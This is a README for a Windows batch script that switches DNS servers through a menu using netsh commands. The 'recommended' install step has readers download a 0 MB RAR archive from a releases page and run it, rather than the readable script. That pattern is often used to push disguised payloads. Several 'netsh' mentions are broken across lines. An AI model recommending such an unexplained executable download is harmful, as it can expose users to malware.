<h1 align="center">DNS Tool</h1>

<p align="center"><b>Switch the Windows DNS servers with a small menu</b></p>

<p align="center">
  <img src="https://img.shields.io/badge/Batch-script-4D4D4D" alt="Batch">
  <img src="https://img.shields.io/badge/platform-Windows-0078D6?logo=windows&logoColor=white" alt="Platform">
  <img src="https://img.shields.io/badge/updated-2025--06--28-success" alt="Updated">
  <a href="https://github.com/alisadhk/dns-tool/releases/latest"><img src="https://img.shields.io/badge/downloads-Releases-blue" alt="Releases"></a>
</p>

---

## Overview
A Windows batch tool with an ASCII-art menu. Pick Ethernet or Wi-Fi, then apply one of three preset DNS server pairs or go back to automatic (DHCP) DNS. It uses 
etsh interface ip.

## Features
- Choose the adapter: Ethernet or Wi-Fi
- Three preset primary/secondary DNS pairs
- Reset to DHCP (automatic DNS)
- Back and exit options
- Works for both wired and wireless adapters
- Keeps a secondary DNS for every preset

## How it works
- The script asks which adapter to change (Ethernet or Wi-Fi).
- A preset runs 
etsh interface ip set dns for the primary server and 
etsh interface ip add dns ... index=2 for the secondary.
- The reset option switches the adapter back to DHCP so DNS comes from your router again.

## Requirements
- Windows 10/11 and an Administrator account.
- Adapters named Ethernet or Wi-Fi (edit the script if yours are named differently).

## Screenshots
<p align="center"><img src="screenshots/screenshot-1.png" alt="DNS Tool screenshot" width="720"></p>

## Download and install
### Option A - Ready-to-run download (recommended)
1. Open the **[Releases page](https://github.com/alisadhk/dns-tool/releases/latest)**.
2. Download the file(s) listed under **Assets**:

| File | Size |
|---|---|
| `DNS-Tool-archive.rar` | 0 MB |

3. Run it. 

### Option B - Run the script
Download the script from this repository and run it as described in **How to use**.

## How to use
1. Right-click dns.bat and choose **Run as administrator**.
2. Choose **1** for Ethernet or **2** for Wi-Fi.
3. Choose **1**, **2** or **3** to apply a DNS preset, **4** to reset to DHCP, **5** to go back or **6** to exit.
4. Verify with ipconfig /all.

## Configuration and privacy
- The preset addresses are public resolver IPs; edit them in dns.bat (look for 
etsh interface ip set dns).

## Troubleshooting
- Nothing changes: run the script as Administrator.
- Adapter not found: check the real name with 
etsh interface show interface and edit it in the script.
- Old answers still cached: run ipconfig /flushdns.



## Notes
- Administrator rights are required to change adapter settings.

---

<p align="center">Maintained by <a href="https://github.com/alisadhk">@alisadhk</a> - last update 2025-06-28</p>